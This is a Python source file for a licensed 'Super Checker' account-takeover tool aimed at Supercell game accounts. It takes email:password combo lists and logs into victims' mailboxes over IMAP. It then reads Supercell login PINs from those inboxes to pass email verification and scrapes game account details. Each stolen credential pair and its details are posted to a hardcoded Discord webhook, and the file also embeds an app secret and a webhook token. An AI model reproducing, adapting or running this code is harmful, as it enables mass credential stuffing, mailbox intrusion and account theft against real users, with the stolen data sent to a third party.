import requests, time, quopri
from urllib.parse import urlparse, parse_qs
import time, os
import re
from imapclient import IMAPClient
import requests
import time
from concurrent.futures import ThreadPoolExecutor
import colorama
from colorama import *
from threading import Thread
from keyauth import api
import imaplib, os, ctypes

import sys
import time
import platform
import os
import hashlib
from time import sleep
from datetime import datetime
import tkinter as tk
from tkinter import filedialog
from threading import Thread





def clear():
    if platform.system() == 'Windows':
        os.system('cls & title Python Example')  # clear console, change title
    elif platform.system() == 'Linux':
        os.system('clear')  # clear console
        sys.stdout.write("\x1b]0;Python Example\x07")  # change title
    elif platform.system() == 'Darwin':
        os.system("clear && printf '\e[3J'")  # clear console
        os.system('''echo -n -e "\033]0;Python Example\007"''')  # change title

print("Initializing")
clear()



def getchecksum():
    md5_hash = hashlib.md5()
    file = open(''.join(sys.argv), "rb")
    md5_hash.update(file.read())
    digest = md5_hash.hexdigest()
    return digest


keyauthapp = api(
    name = "TOOL CHEKER", # Application Name
    ownerid = "TmGBqNllYC", # Owner ID
    secret = "a75b3788bfabd65df7d2b9a2deb373cffec4eef217273cc4d35423205f561c15", # Application Secret
    version = "1.0", # Application Version
    hash_to_check = getchecksum()
)
init()
colorama.init()

threads = []

def clear():
    os.system('cls')

def Mbox(title, text, style):
    return ctypes.windll.user32.MessageBoxW(0, text, title, style)

def center(var: str, space: int = None):
    if not space:
        space = (os.get_terminal_size().columns - len(var.splitlines()[int(len(var.splitlines()) / 2)])) / 2
    return "\n".join((' ' * int(space)) + var for var in var.splitlines())

def hex_to_rgb(hex_color):
    hex_color = hex_color.lstrip('#')
    return tuple(int(hex_color[i:i + 2], 16) for i in (0, 2, 4))

def rgb_to_ansi(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

def set_console_title(title):
    ctypes.windll.kernel32.SetConsoleTitleW(title)

def inboxer():
    os.system('cls')
    def logo():
        print(f'''{Fore.WHITE}
              
        {Fore.CYAN}███████╗██╗   ██╗██████╗ ███████╗██████╗     {Fore.LIGHTBLUE_EX}██╗███╗   ██╗██████╗  ██████╗ ██╗  ██╗███████╗██████╗ 
        {Fore.CYAN}██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗    {Fore.LIGHTBLUE_EX}██║████╗  ██║██╔══██╗██╔═══██╗╚██╗██╔╝██╔════╝██╔══██╗
        {Fore.CYAN}███████╗██║   ██║██████╔╝█████╗  ██████╔╝    {Fore.LIGHTBLUE_EX}██║██╔██╗ ██║██████╔╝██║   ██║ ╚███╔╝ █████╗  ██████╔╝
        {Fore.CYAN}╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗    {Fore.LIGHTBLUE_EX}██║██║╚██╗██║██╔══██╗██║   ██║ ██╔██╗ ██╔══╝  ██╔══██╗
        {Fore.CYAN}███████║╚██████╔╝██║     ███████╗██║  ██║    {Fore.LIGHTBLUE_EX}██║██║ ╚████║██████╔╝╚██████╔╝██╔╝ ██╗███████╗██║  ██║
        {Fore.CYAN}╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝    {Fore.LIGHTBLUE_EX}╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                   
{Fore.RESET}''')

    def search_email(email, password, keyword):
        global good, not_found, bad

        email_parts = email.split('@')
        domain = email_parts[-1]

        outlook_domains = ["hotmail.com", "outlook.com", "hotmail.fr", "outlook.fr", "live.com", "live.fr"]

        if domain in outlook_domains:
            imap_servers = ['outlook.office365.com']
        else:
            imap_servers = [f'imap.{domain}']

        for imap_server in imap_servers:
            try:
                imap = imaplib.IMAP4_SSL(imap_server, timeout=30)
            except Exception as e:
                continue

            try:
                imap.login(email, password)
                status, messages = imap.select("inbox")
                if status == "OK":
                    result, data = imap.uid("search", None, f'(TEXT "{keyword}")')
                    if result == "OK":
                        mentioned_times = len(data[0].split()) if data[0] else 0

                        if mentioned_times > 0:
                            good += 1
                            result_string = f"{email}:{password}"

                            current_date = datetime.now().strftime("%Y-%m-%d")
                            filename = f"cuentas.txt"
                            with open(filename, "a") as result_file:
                                result_file.write(result_string + "\n")
                        else:
                            not_found += 1
                            with open(f"hits_hotmail.txt", "a") as valid_file:
                                valid_file.write(f"{email}:{password}\n")
                    else:
                        bad += 1

            except Exception as e:
                bad += 1
            finally:
                try:
                    imap.logout()
                except Exception as e:
                    pass



    def inbox_searcher(keyword):
        global good, not_found, bad
        good = 0
        not_found = 0
        bad = 0

        print(f"         {Fore.CYAN}[>] {Fore.WHITE}Load a file")
        file = filedialog.askopenfilename(title="Seleccionar archivo")

        with open(file, "r", encoding="utf-8", errors="ignore") as file:
            lines = [line.strip().split(":") for line in file.readlines()]
            total_combos = len(lines)
        print(f"Loaded: {total_combos} Lines! ~")
        print(f"Searching: supercell inbox")
        if keyword == 0:
            pass
        print()

        credentials = []
        batch_size = 500
        for i in range(0, len(lines), batch_size):
            batch = lines[i:i + batch_size]
            for credentials_in_batch in batch:
                try:
                    if len(credentials_in_batch) >= 2:
                        email, password = credentials_in_batch[0], credentials_in_batch[1]
                        credentials.append((email, password))
                    else:
                        pass
                except Exception as e:
                    pass

        for credentials in credentials:
            email, password = credentials[0], credentials[1]
            thread = Thread(target=search_email, args=(email, password, keyword))
            thread.start()
        else:
            pass

        for thread in threads:
            thread.join()

        os.system('cls')
        logo()
        ctypes.windll.kernel32.SetConsoleTitleW(
            f"Keyword : {keyword} | Found : {good} | Not Found : {not_found} | Bad Mail Access : {bad}".encode(
                "utf-16le"))
        print()
        print(
            f'''         {Fore.CYAN}[>] {Fore.WHITE}Checking... {Fore.GREEN}''')
        print('')
        time.sleep(4)
        print(f"         {Fore.CYAN}[+] {Fore.WHITE}Found {Fore.GREEN}{good} {Fore.WHITE}Inboxes")
        time.sleep(4)
        os.system('cls') if os.name == 'nt' else os.system('clear')

    logo()

    keyword = 'noreply@id.supercell.com'

    inbox_searcher(keyword)



def answer():
    colorama.init()

    
    ascii = f'''{Fore.LIGHTBLUE_EX}
    

             ███╗   ██╗███████╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
             ████╗  ██║╚══███╔╝    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
             ██╔██╗ ██║  ███╔╝     ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
             ██║╚██╗██║ ███╔╝      ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
             ██║ ╚████║███████╗    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
             ╚═╝  ╚═══╝╚══════╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                              


                                        {Fore.WHITE}Cracked by @_r4nz3 {Fore.LIGHTBLACK_EX}| {Fore.GREEN}v1.1
                                               '''
    os.system('cls')
    print(ascii)
    try:
        print(f"""
                          {Fore.CYAN} [ {Fore.WHITE}1 {Fore.CYAN}] {Fore.WHITE}Login
                          {Fore.CYAN} [ {Fore.WHITE}2 {Fore.CYAN}] {Fore.WHITE}Register


        """)
        ans = input(f"                          {Fore.CYAN} [ {Fore.WHITE}>>> {Fore.CYAN}] {Fore.WHITE}")
        print('')
        if ans == "1":
            user = input(f'                           {Fore.CYAN} [ {Fore.WHITE}> {Fore.CYAN}] {Fore.WHITE}Username > ')
            print('')
            password = input(f'                           {Fore.CYAN} [ {Fore.WHITE}> {Fore.CYAN}] {Fore.WHITE}Password > {Fore.BLACK}')
            keyauthapp.login(user, password)
        elif ans == "2":
            user = input(f'                       {Fore.CYAN} [ {Fore.WHITE}> {Fore.CYAN}] {Fore.WHITE}Username > ')
            password = input(f'                       {Fore.CYAN} [ {Fore.WHITE}> {Fore.CYAN}] {Fore.WHITE}Passowrd > {Fore.BLACK}')
            license = input(f'                       {Fore.CYAN} [ {Fore.WHITE}> {Fore.CYAN}] {Fore.WHITE}License > ')

        else:
            print("\nInvalid option")
            sleep(1)
            clear()
            answer()
    except KeyboardInterrupt:
        os._exit(1)



answer()



def supercheck():
    ascii2 = f'''      

         {Fore.CYAN}███████╗██╗   ██╗██████╗ ███████╗██████╗     {Fore.LIGHTBLUE_EX}██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
         {Fore.CYAN}██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗   {Fore.LIGHTBLUE_EX}██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
         {Fore.CYAN}███████╗██║   ██║██████╔╝█████╗  ██████╔╝   {Fore.LIGHTBLUE_EX}██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
         {Fore.CYAN}╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗   {Fore.LIGHTBLUE_EX}██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
         {Fore.CYAN}███████║╚██████╔╝██║     ███████╗██║  ██║   {Fore.LIGHTBLUE_EX}╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
         {Fore.CYAN}╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝    {Fore.LIGHTBLUE_EX}╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                 '''

    os.system('cls' if os.name == 'nt' else 'clear')

    print(ascii2)
    print('')
    print('')
    input(f'         {Fore.LIGHTCYAN_EX}[ > ] {Fore.LIGHTWHITE_EX}Press enter to start checking')
    os.system('cls' if os.name == 'nt' else 'clear')
    print(ascii2)

    def get_brawlers(tag):
        r = requests.get(f"https://brawlify.com/stats/profile/{tag.replace('#', '')}")
        text = r.text.split('<td class="text-left text-hp shadow-normal">')[1].split('\n')[0]
        pattern = r'(\d+)<span\sclass="text-muted">\s/\s(\d+)'
        match = re.search(pattern, text)
        if match:
            numerator = match.group(1)
            denominator = match.group(2)
            fraction = numerator + '/' + denominator
            return fraction

    def get_build_id(request):
        global build_id
        r = request.get("https://store.supercell.com/")
        build_id = r.text.split('"buildId"')[1].split('"')[1]
        return build_id

    def get_region(email_address):
        _, domain = email_address.split('@', 1)
        outlook_domains = ["hotmail.com", "outlook.com", "hotmail.fr", "outlook.fr", "live.com", "live.fr", "msn.com"]
        if domain in outlook_domains:
            return "Outlook"
        else:
            return "Other"
        


    def get_imap_server(email_address):
        _, domain = email_address.split('@', 1)
        if domain in ["hotmail.com", "outlook.com", "hotmail.fr", "outlook.fr", "live.com", "live.fr", "msn.com"]:
            imap_server = 'outlook.office365.com'
            region = "Outlook"
        elif domain in ["t-online.de", "magenta.de"]:
            imap_server = 'secureimap.t-online.de'
            region = "T-Online"
        else:
            imap_server = f'imap.{domain}'
            region = "Other"
        return imap_server, region

    def search_email(email, password, sender):
        global good, not_found, bad

        email_parts = email.split('@')
        domain = email_parts[-1]

        imap_server, region = get_imap_server(email)

        with IMAPClient(imap_server) as client:
            print(f"          {Fore.LIGHTBLUE_EX}[ + ] {Fore.WHITE}Checking Email: ", email)
            client.login(email, password)
            client.select_folder('INBOX')
            messages = client.search()
            messages.sort(reverse=True)

            if messages:
                latest_message_uid = messages[0]
                latest_message_envelope = client.fetch(latest_message_uid, ['ENVELOPE'])
                latest_subject = latest_message_envelope[latest_message_uid][b'ENVELOPE'].subject.decode()
                latest_subject = quopri.decodestring(latest_subject).decode('utf-8')
                pattern = r'\[(\d+)\s+(\d+)\]'
                matches = re.search(pattern, latest_subject)
                if matches:
                    pin = matches.group(1) + matches.group(2)
                    print(f"          {Fore.LIGHTCYAN_EX}[ ! ] {Fore.WHITE}Received Supercell login Pin from {email}: {Fore.LIGHTCYAN_EX}", pin)
                    return pin

    def login(creds):
        request = requests.session()
        email, password = creds.split(":")
        r = request.get(f"https://store.supercell.com/_next/data/{build_id}/en/oauth/begin.json?redirectUri=%2F")
        d = r.json()
        redirect = d['pageProps']['__N_REDIRECT']
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en;q=0.9,bn;q=0.8,en-US;q=0.7',
            'priority': 'u=0, i',
            'referer': 'https://store.supercell.com/',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        }
        r = request.get(redirect, headers=headers, allow_redirects=False)
        token = parse_qs(urlparse(r.headers['Location']).query)['token'][0]
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-GB,en;q=0.9,bn;q=0.8,en-US;q=0.7',
            'authorization': f'Bearer {token}',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://accounts.supercell.com',
            'priority': 'u=1',
            'referer': 'https://accounts.supercell.com/login',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        }
        data = {
               'email': email,
               'lang': 'en',
        }
        response = request.post('https://accounts.supercell.com/oauth/login', headers=headers, data=data)
        try:
            d = response.json()
        except:
            print(f"{Fore.RED} Ratelimit detected {Fore.GREEN}Solve {Fore.WHITE}wait a few minutes.")
            print(response.headers)
            return 'rate'
        nt = d['data']['token']
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-GB,en;q=0.9,bn;q=0.8,en-US;q=0.7',
            'authorization': f'Bearer {nt}',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://accounts.supercell.com',
            'priority': 'u=1, i',
            'referer': 'https://accounts.supercell.com/verify',
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        }
        time.sleep(5)
        pin = search_email(email, password, '')
        if not pin:
            return
        data = {
            'pin': pin,
        }
        response = request.post('https://accounts.supercell.com/oauth/v2/login.confirm', headers=headers, data=data, allow_redirects=False)
        red = response.json()['data']['redirect_uri']
        headers = {
            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
            'Referer': 'https://store.supercell.com/account',
            'baggage': 'sentry-environment=production,sentry-release=8908777949,sentry-public_key=ea3492c3b6144f7cb83fe9bd3194bfc5,sentry-trace_id=0f0668f071544b3cb6570e30386b0d66,sentry-sample_rate=0.05,sentry-transaction=%2Faccount,sentry-sampled=false',
            'sec-ch-ua-mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'sentry-trace': '0f0668f071544b3cb6570e30386b0d66-8147dab8ea7a0fa5-0',
            'sec-ch-ua-platform': '"Windows"',
        }
        r = request.get(red)
        response = request.get('https://store.supercell.com/api/session', headers=headers)
        d = response.json()
        coc = None
        cr = None
        bs = None
        hd = None
        sb = None
        for application in d['profile']['applications']:
            if application['application'] == "squadbusters":
                sb = application.get('account')
            if application['application'] == "clashofclans":
                coc = application.get('account')
            if application['application'] == "hayday":
                hd = application.get('account')
            if application['application'] == "clashroyale":
                cr = application.get('account')
            if application['application'] == "brawlstars":
                bs = application.get('account')
        if coc:
            coc = f"Tag: {coc['tag']} | Name: {coc['name']} | Town hall: {coc['progress'][0]} | Trophies: {coc['progress'][1]}"
        if cr:
            cr = f"Tag: {cr['tag']} | Name: {cr['name']} | Progress: {cr['progress'][0]} | Trophies: {cr['progress'][1]}"
        if bs:
            try:
                brawlers = get_brawlers(bs['tag'])
            except:
                brawlers = "Can't Capture"
            bs = f"Tag: {bs['tag']} | Name: {bs['name']} | Brawlers: {brawlers} | Level: {bs['progress'][0]} | Trophies: {bs['progress'][1]}"
        if hd:
            hd = f"Tag: {hd['tag']} | Name: {hd['name']} | Level: {hd['progress'][0]}"

        text = f"""
          {Fore.LIGHTCYAN_EX}[ HIT ] {Fore.WHITE}Account: {email}:{password}
          {Fore.LIGHTCYAN_EX}[ > ] {Fore.LIGHTWHITE_EX}Clash Of Clans: {Fore.GREEN}{coc or f'{Fore.RED}No COC'}
          {Fore.LIGHTCYAN_EX}[ > ] {Fore.LIGHTWHITE_EX}Brawl Stars: {Fore.GREEN}{bs or f'{Fore.RED}No BS'}
          {Fore.LIGHTCYAN_EX}[ > ] {Fore.LIGHTWHITE_EX}Clash Royale: {Fore.GREEN}{cr or f'{Fore.RED}No CR'}
          {Fore.LIGHTCYAN_EX}[ > ] {Fore.LIGHTWHITE_EX}Hay Day: {Fore.GREEN}{hd or f'{Fore.RED}No HD'}
          {Fore.LIGHTCYAN_EX}[ > ] {Fore.LIGHTWHITE_EX}Squad Busters: {Fore.GREEN}{sb or f'{Fore.RED}No SB'}
        """
        print(text)
        hit = f"""
Account: {email}:{password}
Clash Of Clans: {coc or 'No COC'}
Brawl Stars: {bs or 'No BS'}
Clash Royale: {cr or 'No CR'}
Hay Day: {hd or 'No HD'}
Squad Busters: {sb or 'No SB'}
    """
        open("hits.txt", "a").write(hit + '\n')
        send_discord_webhook(hit)


    accs = [l for l in open("cuentas.txt", "r").read().splitlines() if ":" in l and "@" in l]
    with ThreadPoolExecutor(max_workers=20) as exc:
        get_build_id(requests)
        for acc in accs:
            f = exc.submit(login, acc)
    
    input(f'          {Fore.LIGHTCYAN_EX}[ + ] {Fore.LIGHTWHITE_EX}Progress finished. Enter to return main menu.')

def send_discord_webhook(content):
    webhook_url = "https://discord.com/api/webhooks/1246567497306603551/oiE5PpVLwfCfGHQ3-WiMlTEbi_AKU7HVbW4NcTe9OqQPBfx8e6069xt4MazBOnLBILrG"
    payload = {"content": content}
    headers = {"Content-Type": "application/json"}
    response = requests.post(webhook_url, json=payload, headers=headers)

def update_console_title(subs):
    title_info = []
    for sub in subs:
        sub_name = sub["subscription"]  # Subscription from every Sub
        expiry = datetime.utcfromtimestamp(int(sub["expiry"])).strftime('%Y-%m-%d %H:%M:%S')  # Expiry date from every Sub
        timeleft = sub["timeleft"]  # Timeleft from every Sub
        title_info.append(f"Sub: {sub_name} --- Expires: {expiry} --- Timeleft: {timeleft} --- Join: discord.gg/resellme")
    title = " | ".join(title_info)
    os.system(f'title {title}')  # Change the console title

def display_subscriptions(subs):
    for i in range(len(subs)):
        sub = subs[i]["subscription"]
        expiry = datetime.utcfromtimestamp(int(subs[i]["expiry"])).strftime('%Y-%m-%d %H:%M:%S')
        timeleft = subs[i]["timeleft"]

def main_menu():
    ascii_art = f''' 
    

         {Fore.CYAN}███████╗██╗   ██╗██████╗ ███████╗██████╗     {Fore.LIGHTBLUE_EX}██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
         {Fore.CYAN}██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗   {Fore.LIGHTBLUE_EX}██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
         {Fore.CYAN}███████╗██║   ██║██████╔╝█████╗  ██████╔╝   {Fore.LIGHTBLUE_EX}██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
         {Fore.CYAN}╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗   {Fore.LIGHTBLUE_EX}██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
         {Fore.CYAN}███████║╚██████╔╝██║     ███████╗██║  ██║   {Fore.LIGHTBLUE_EX}╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
         {Fore.CYAN}╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝    {Fore.LIGHTBLUE_EX}╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                 '''
    print(ascii_art) 
    print('')
    print('')
    
    print(f'         {Fore.BLUE} [ {Fore.WHITE}1 {Fore.BLUE}] {Fore.WHITE}Inbox searcher')
    print('')
    print(f'         {Fore.BLUE} [ {Fore.WHITE}2 {Fore.BLUE}] {Fore.WHITE}Supercell full capture')
    print('')
    print('')

def main():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        subs = keyauthapp.user_data.subscriptions  # Get all Subscription names, expiry, and timeleft
        update_console_title(subs)
        display_subscriptions(subs)
        main_menu()
        
        choice = input(f'         {Fore.CYAN} [ {Fore.WHITE}> {Fore.CYAN}] {Fore.LIGHTWHITE_EX}Choice > {Fore.WHITE}')
        if choice == '1':
            inboxer()
        elif choice == '2':
            supercheck()

if __name__ == "__main__":
    main()
